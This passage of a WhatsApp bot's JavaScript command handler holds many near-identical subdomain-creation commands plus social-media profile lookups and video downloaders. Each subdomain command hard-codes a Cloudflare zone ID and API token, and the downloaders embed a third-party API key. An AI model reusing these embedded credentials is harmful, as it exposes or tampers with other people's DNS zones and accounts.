                          if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙩𝙨\n┗━━━━━━━━━━━━━━━━━━━`);
             else reply(`failed to create subdomain\nMsg: ${e['error']}`)
           }); }
break
case  'd37': {
        if (!DareTheCreator) return reply(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "edf8e5a66859e6a1f8ccbde07c415082";
               let apitoken = "p0gm6UzsPw0Y0eudhfDr1ZBvV_WjX9eMpTp4ksXZ"
               let tld = "didindev.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("where is the host & ip?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host is invalid, make sure the host only contains letters, numbers, - (stripes), and . (point)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙩𝙨\n┗━━━━━━━━━━━━━━━━━━━`);
             else reply(`failed to create subdomain\nMsg: ${e['error']}`)
           }); }
break
        
case 'd38': {
if (!DareTheCreator) return reply(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "eb6a14586a737768de8eb75e417be305";
               let apitoken = "WG-rSvje9yH9EXKyMZqyBP8yUtpWmUoQmsoxfpnO";
               let tld = "ruztanxd.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("where is the host & ip?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host is invalid, make sure the host only contains letters, numbers, - (stripes), and . (point)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━
┣ Ip = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ Username = ${e['name']}
┗━━━━━━━━━━━━━━━━━━━
┣ crate by = ${namabot}
┗━━━━━━━━━━━━━━━━━━━
*𝙎𝙪𝙥𝙥𝙤𝙧𝙩 𝙬𝙞𝙣𝙙𝙖 𝙩𝙚𝙧𝙪𝙨 𝙮𝙖𝙖 >_<*`);
             else reply(`failed to create subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'd39': {
        if (!DareTheCreator) return reply(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "0cf0d98bcb60af202ad5816f672ca471";
               let apitoken = "f5ApkZpsRdJxTuA0xlfr9vCJ1bknGAAJ7rv10H_f";
               let tld = "sellerpanell-store.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("where is the host & ip?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host is invalid, make sure the host only contains letters, numbers, - (stripes), and . (point)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━
┣ 𝙄𝙥 = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ 𝙐𝙨𝙚𝙧𝙣𝙖𝙢𝙚 = ${e['name']} 
┗━━━━━━━━━━━━━━━━━━━
┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝐃𝐀𝐑𝐄-𝐕𝟑�
┗━━━━━━━━━━━━━━━━━━━
*NOTE SUBDOMAIN*
> *NOT FOR WHM*
> *ALWAYS BE CAREFUL OF DDOS*
> *DO NOT SPAM BOTS*
> *IF ANY SUB IS DAMAGED, REPORT IT*
 @𝐃𝐀𝐑𝐄-𝐕𝟑�

*THANK YOU*`);
             else reply(`failed to create subdomain\nMsg: ${e['error']}`)
           }); }
           
           break
           
 case 'd40': {
    if (!DareTheCreator) return reply(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "583196d8ec9e16fbe5bbe944efbb3d8a";
               let apitoken = "jZ4EuzWs4-ktGcfkwht3NbZfGlZm_VnWjtYyG-1U";
               let tld = "rafeyfah.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("where is the host & ip?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host is invalid, make sure the host only contains letters, numbers, - (stripes), and . (point)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━
┣ 𝙄𝙥 = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ 𝙐𝙨𝙚𝙧𝙣𝙖𝙢𝙚 = ${e['name']} 
┗━━━━━━━━━━━━━━━━━━━
┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝐃𝐀𝐑𝐄-𝐕𝟑�
┗━━━━━━━━━━━━━━━━━━━
*NOTE SUBDOMAIN*
> *NOT FOR WHM*
> *ALWAYS BE CAREFUL OF DDOS*
> *DO NOT SPAM BOTS*
> *IF ANY SUB IS DAMAGED, REPORT IT*
 ©𝐃𝐀𝐑𝐄-𝐕𝟑�

*THANK YOU*`);
             else reply(`failed to create subdomain\nMsg: ${e['error']}`)
           }); }
           break

case 'd41': {
    if (!DareTheCreator) return reply(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "144f7c48ca035135390fe5adb49d642f";
               let apitoken = "KGhjPqE6foR70mzTnrd4X1DSopNBVtMJJSudc6wi";
               let tld = "kayyoffc.tech";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("where is the host & ip?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host is invalid, make sure the host only contains letters, numbers, - (stripes), and . (point)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━
┣ 𝙄𝙥 = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ 𝙐𝙨𝙚𝙧𝙣𝙖𝙢𝙚 = ${e['name']} 
┗━━━━━━━━━━━━━━━━━━━
┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝐃𝐀𝐑𝐄-𝐕𝟑�
┗━━━━━━━━━━━━━━━━━━━
*NOTE SUBDOMAIN*
> *NOT FOR WHM*
> *ALWAYS BE CAREFUL OF DDOS*
> *DO NOT SPAM BOTS*
> *IF ANY SUB IS DAMAGED, REPORT IT*
 ©𝐃𝐀𝐑𝐄-𝐕𝟑�

*THANK YOU*`);
             else reply(`failed to create subdomain\nMsg: ${e['error']}`)
           }); }
break 
case 'd42': {
    if (!DareTheCreator) return reply(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "4fc8192dd8160307100b207d308da80c";
               let apitoken = "KGhjPqE6foR70mzTnrd4X1DSopNBVtMJJSudc6wi";
               let tld = "kayypedia.com";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("where is the host & ip?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host is invalid, make sure the host only contains letters, numbers, - (stripes), and . (point)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━
┣ 𝙄𝙥 = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ 𝙐𝙨𝙚𝙧𝙣𝙖𝙢𝙚 = ${e['name']} 
┗━━━━━━━━━━━━━━━━━━━
┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝐃𝐀𝐑𝐄-𝐕𝟑�
┗━━━━━━━━━━━━━━━━━━━
*NOTE SUBDOMAIN*
> *NOT FOR WHM*
> *ALWAYS BE CAREFUL OF DDOS*
> *DO NOT SPAM BOTS*
> *IF ANY SUB IS DAMAGED, REPORT IT*
 ©𝐃𝐀𝐑𝐄-𝐕𝟑�

*THANK YOU*`);
             else reply(`failed to create subdomain\nMsg: ${e['error']}`)
           }); }
break 
case 'd43': {
    if (!DareTheCreator) return reply(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "a1fa0ffcde9549bd36e9ae3de4b66b4a";
               let apitoken = "KGhjPqE6foR70mzTnrd4X1DSopNBVtMJJSudc6wi";
               let tld = "panell.icu";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("where is the host & ip?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host is invalid, make sure the host only contains letters, numbers, - (stripes), and . (point)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━
┣ 𝙄𝙥 = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ 𝙐𝙨𝙚𝙧𝙣𝙖𝙢𝙚 = ${e['name']} 
┗━━━━━━━━━━━━━━━━━━━
┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝐃𝐀𝐑𝐄-𝐕𝟑�
┗━━━━━━━━━━━━━━━━━━━
*NOTE SUBDOMAIN*
> *NOT FOR WHM*
> *ALWAYS BE CAREFUL OF DDOS*
> *DO NOT SPAM BOTS*
> *IF ANY SUB IS DAMAGED, REPORT IT*
 ©𝐃𝐀𝐑𝐄-𝐕𝟑�

*THANK YOU*`);
             else reply(`failed to create subdomain\nMsg: ${e['error']}`)
           }); }
break 
case 'd44': {
    if (!DareTheCreator) return reply(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "a112599ddfdd5a2bac5dc91864020015";
               let apitoken = "KGhjPqE6foR70mzTnrd4X1DSopNBVtMJJSudc6wi";
               let tld = "panellstoree.com";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("where is the host & ip?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host is invalid, make sure the host only contains letters, numbers, - (stripes), and . (point)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━
┣ 𝙄𝙥 = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ 𝙐𝙨𝙚𝙧𝙣𝙖𝙢𝙚 = ${e['name']} 
┗━━━━━━━━━━━━━━━━━━━
┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝐃𝐀𝐑𝐄-𝐕𝟑�
┗━━━━━━━━━━━━━━━━━━━
*NOTE SUBDOMAIN*
> *NOT FOR WHM*
> *ALWAYS BE CAREFUL OF DDOS*
> *DO NOT SPAM BOTS*
> *IF ANY SUB IS DAMAGED, REPORT IT*
 ©𝐃𝐀𝐑𝐄-𝐕𝟑�

*THANK YOU*`);
             else reply(`failed to create subdomain\nMsg: ${e['error']}`)
           }); }
break 
case 'd45': {
    if (!DareTheCreator) return reply(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "fc1ee81d43fce2e42edcef622e5cf370";
               let apitoken = "F3bZqMzcRMxxinfwtcLVSLkfu85eNyxQ52JvDSyu";
               let tld = "windastore.live";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("where is the host & ip?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host is invalid, make sure the host only contains letters, numbers, - (stripes), and . (point)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━
┣ 𝙄𝙥 = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ 𝙐𝙨𝙚𝙧𝙣𝙖𝙢𝙚 = ${e['name']} 
┗━━━━━━━━━━━━━━━━━━━
┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝐃𝐀𝐑𝐄-𝐕𝟑�
┗━━━━━━━━━━━━━━━━━━━
*NOTE SUBDOMAIN*
> *NOT FOR WHM*
> *ALWAYS BE CAREFUL OF DDOS*
> *DO NOT SPAM BOTS*
> *IF ANY SUB IS DAMAGED, REPORT IT*
 ©𝐃𝐀𝐑𝐄-𝐕𝟑�

*THANK YOU*`);
             else reply(`failed to create subdomain\nMsg: ${e['error']}`)
           }); }
break 
case 'd46': {
    if (!DareTheCreator) return reply(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "c68dc22e3ccc2aaf123f68011e3187d1";
               let apitoken = "XICagFHVbQ52OkAbYqglNUKBv0cps3Qe8h6YC4Sa";
               let tld = "zanofc.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("where is the host & ip?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host is invalid, make sure the host only contains letters, numbers, - (stripes), and . (point)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━
┣ 𝙄𝙥 = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ 𝙐𝙨𝙚𝙧𝙣𝙖𝙢𝙚 = ${e['name']} 
┗━━━━━━━━━━━━━━━━━━━
┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝐃𝐀𝐑𝐄-𝐕𝟑�
┗━━━━━━━━━━━━━━━━━━━
*NOTE SUBDOMAIN*
> *NOT FOR WHM*
> *ALWAYS BE CAREFUL OF DDOS*
> *DO NOT SPAM BOTS*
> *IF ANY SUB IS DAMAGED, REPORT IT*
 ©𝐃𝐀𝐑𝐄-𝐕𝟑�

*THANK YOU*`);
             else reply(`failed to create subdomain\nMsg: ${e['error']}`)
           }); }
break
case 'request': case 'reportbug': {
  reply(mess.wait)
	if (!text) return replydare(`Example : ${
        prefix + command
      } hi dev play command is not working`)
            textt = `*| REQUEST/BUG |*`
            teks1 = `\n\n*User* : @${
   m.sender.split("@")[0]
  }\n*Request/Bug* : ${text}`
            teks2 = `\n\n*𝙎𝘼𝙇𝘼𝙈 🥇 ${pushname}, Your request has been forwarded to my Owner*.\n*Please wait...*`
            for (let i of owner) {
Dare.sendMessage(i + "@s.whatsapp.net", {
text: textt + teks1,
mentions: [m.sender],
}, {
quoted: m,
})
            }
            Dare.sendMessage(m.chat, {
text: textt + teks2 + teks1,
mentions: [m.sender],
            }, {
quoted: m,
            })

        }
        break
case 'q': case 'quoted': {
if (!m.quoted) return replydare('Reply the Message!!')
let xeonquotx= await Dare.serializeM(await m.getQuotedObj())
if (!xeonquotx.quoted) return replydare('The message you replied to was not sent by a bot')
await xeonquotx.quoted.copyNForward(m.chat, true)
}
break
case 'igstalk2':{
reply(mess.wait)
if (!q) return replydare(`Example ${prefix+command} YOO .𝐁𝐌𝐁`)
reply(mess.wait)
const aj = await igstalk(`${q}`)
Dare.sendMessage(m.chat, { image: { url : aj.profile }, caption: 
`*/ Instagram Stalker \\*

Full name : ${aj.fullname}
Username : ${aj.username}
Post : ${aj.post}
Followers : ${aj.followers}
Following : ${aj.following}
Bio : ${aj.bio}` }, { quoted: m } )
}
break
case 'ffstalk':{
reply(mess.wait)
if (!q) return replydare(`Example ${prefix+command} 234xxxx`)
reply(mess.wait)
const data = await fetchJson(`https://skizo.tech/api/stalk/game/FREEFIRE?apikey=nanogembul&id=${encodeURIComponent(text)}&zone=false`)
const data1 = data.data.roles
replydare(`*/ Free Fire Stalker \\*

Id : ${data1.player_id}
Nickname : ${data1.role}`)
}
break
case 'mlstalk': {
if (!text) return reply(`Example usage: \n${prefix + command} id|zone id\n\nEx.\n${prefix + command} 157228049|2241`)
 async function mlstalk(id, zoneId) {
    return new Promise(async (resolve, reject) => {
      axios
        .post(
          'https://api.duniagames.co.id/api/transaction/v1/top-up/inquiry/store',
          new URLSearchParams(
            Object.entries({
              productId: '1',
              itemId: '2',
              catalogId: '57',
              paymentId: '352',
              gameId: id,
              zoneId: zoneId,
              product_ref: 'REG',
              product_ref_denom: 'AE',
            })
          ),
          {
            headers: {
              'Content-Type': 'application/x-www-form-urlencoded',
              Referer: 'https://www.duniagames.co.id/',
              Accept: 'application/json',
            },
          }
        )
        .then((response) => {
          resolve(response.data.data.gameDetail)
        })
        .catch((err) => {
          reject(err)
        })
    })
}

var { userName } = await mlstalk(text.split('|')[0], text.split('|')[1]).catch(async _ => await reply("User not found"))
var vf = `*MOBILE LEGENDS STALK*

*ID: ${text.split('|')[0]}*
*ZONA ID: ${text.split('|')[1]}*
*Username: ${userName ? userName : "Empty"}*`
reply(vf)
         }
         break
case 'npmstalk':{
  reply(mess.wait)
if (!q) return replydare(`Example ${prefix+command} 𝐁𝐌𝐁api`)
reply(mess.wait)
eha = await npmstalk.npmstalk(q)
replydare(`*/ Npm Stalker \\*

Name : ${eha.name}
Version Latest : ${eha.versionLatest}
Version Publish : ${eha.versionPublish}
Version Update : ${eha.versionUpdate}
Latest Dependencies : ${eha.latestDependencies}
Publish Dependencies : ${eha.publishDependencies}
Publish Time : ${eha.publishTime}
Latest Publish Time : ${eha.latestPublishTime}`)
}
break
//=========================================\\
case 'twitterdl':
case 'twitter': {
  function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
if (!text) return reply('Where is the link, bro?..');
try {
  reply(mess.wait);
const response = await fetch(`https://skizo.tech/api/twitter?apikey=nanogembul&url=${encodeURIComponent(text)}`);
const data = await response.json();
for (let ii = 0; ii < data.media.length; ii++) {
  const caption = ii === 0 ? data.authorName : '';
  const url = data.media[ii].url;
  const type = data.media[ii].type.includes('video') ? 'video' : 'image';
  await Dare.sendMessage(m.chat, {
    [type]: {
      url: url,
    },
    caption,
  }, {
    quoted: m,
  });
  await delay(1500);
}
} catch (e) {
  console.error(e);
  reply('Server error!');
  return e.toString();
}
}
break
//=========================================\\
case 'tiktok':
case 'tt': {
if (!isPrem) return replydare('𝗡𝗼 𝗔𝗰𝗰𝗲𝘀')
  if (!text) return replydare(`Example: ${prefix + command} link`);
reply(mess.wait)
try {
  const data = await fetchJson(`https://api.tiklydown.eu.org/api/download?url=${encodeURIComponent(text)}`)
  const vidnya = data.video.noWatermark
  const caption = `*[ TIKTOK DOWNLOADER ]*

*Video from* _${data.author.name ?? ''} (@${data.author.unique_id ?? ''})_
*Likes*: _${data.stats.likeCount ?? ''}_
*Comments*: _${data.stats.commentCount ?? ''}_
*Shares*: _${data.stats.shareCount ?? ''}_
*Plays*: _${data.stats.playCount ?? ''}_
*Saves*: _${data.stats.saveCount ?? ''}_

\`⏤͟͟͞͞ Downloaded By ${botname}\`
`;
  Dare.sendMessage(m.chat, { caption: caption, video: { url: vidnya } }, { quoted: m })
} catch {
  const response = await fetchJson(`https://api.tiklydown.eu.org/api/download/v3?url=${encodeURIComponent(text)}`)
  const videoUrl = response.result.video;
  const captionn = `*[ TIKTOK DOWNLOADER ]*

Likes: ${response.result.statistics.likeCount ?? ''}
Comments: ${response.result.statistics.commentCount ?? ''}
Shares: ${response.result.statistics.shareCount ?? ''}
by ${response.result.author.nickname ?? ''}

\`⏤͟͟͞͞ Downloaded By ${botname}\`
  `;
  Dare.sendMessage(m.chat, { caption: captionn, video: { url: videoUrl } }, { quoted: m })
}

}
break;
//==============================================
case 'instagram': case 'igdl': case 'ig': case 'igvideo': case 'igimage': case 'igvid': case 'igimg': {
	  if (!text) return replydare(`You need to provide the URL of any Instagram video, post, reel, image`)
	  reply(mess.wait)
 try {
    const data = await fetchJson(`https://widipe.com/download/igdl?url=${encodeURIComponent(text)}`);
    if (data && data.result && data.result.length > 0 && data.result[0].url) {
        const hasil = data.result[0].url;
        const cap = `Here it is bro🙂`;
        Dare.sendMessage(m.chat, {video: {url: hasil}, caption: cap}, {quoted: m});
    } else {
        throw new Error('URL not found in result');
    }
} catch (error) {
    console.error(error);
    const cap = `Sorry, the video couldn't be taken. These are the available images:`;
    Dare.sendMessage(m.chat, { image: {url: hasil}, caption: cap}, {quoted: m});
}
}
break
case 'snackvideo': {
  if (!text) return reply(mess.query.link)
